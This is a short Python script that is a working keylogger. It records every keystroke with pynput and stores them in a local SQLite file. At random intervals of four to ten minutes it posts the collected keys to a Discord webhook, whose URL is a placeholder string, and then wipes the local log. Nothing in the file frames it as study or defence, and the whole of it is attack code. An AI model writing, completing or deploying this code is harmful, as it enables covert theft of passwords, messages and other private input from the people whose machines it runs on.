import os
import time
import requests
import sqlite3
import random
from pynput import keyboard

discord = 'asdasdasdasadasootherpeoplecantgetmydiscrodwebhook'
db = "m.db"

def create_database():
    conn = sqlite3.connect(db)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY,
            ss TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()

def msg_discord(lol):
    data = {
        "content": lol
    }
    requests.post(discord, json=data)

def on_press(key):
    try:
        ss = f"{key.char}"
    except AttributeError:
        ss = str(key)

    conn = sqlite3.connect(db)
    cursor = conn.cursor()
    cursor.execute("INSERT INTO logs (ss) VALUES (?)", (ss,))
    conn.commit()
    conn.close()

def send():
    while True:
        time.sleep(random.uniform(240, 600))

        conn = sqlite3.connect(db)
        cursor = conn.cursor()
        cursor.execute("SELECT ss FROM logs")
        logs = cursor.fetchall()
        lol = "\n".join([entry[0] for entry in logs])
        
        if lol:
            msg_discord(lol)

            cursor.execute("DELETE FROM logs")
            conn.commit()

        conn.close()

create_database()
with keyboard.Listener(on_press=on_press) as listener:
    send()
    listener.join()
